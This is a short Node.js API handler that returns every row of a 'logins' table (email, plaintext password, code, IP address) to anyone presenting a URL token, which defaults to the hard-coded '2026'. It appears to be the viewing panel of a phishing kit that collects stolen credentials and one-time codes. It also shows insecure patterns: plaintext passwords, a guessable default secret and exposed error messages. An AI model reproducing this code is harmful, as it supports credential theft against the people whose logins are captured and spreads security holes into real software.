const { getPool, initTable } = require('../lib/db');

module.exports = async (req, res) => {
  const token = req.url.split('?token=')[1]?.split('&')[0] || '';
  const secret = process.env.PANEL_TOKEN || '2026';

  if (token !== secret) {
    res.status(401).json({ error: 'Unauthorized' });
    return;
  }

  try {
    await initTable();
    const pool = getPool();
    const result = await pool.query(
      'SELECT id, email, password, code, ip_address, created_at FROM logins ORDER BY created_at DESC'
    );
    res.status(200).json({ data: result.rows });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
};
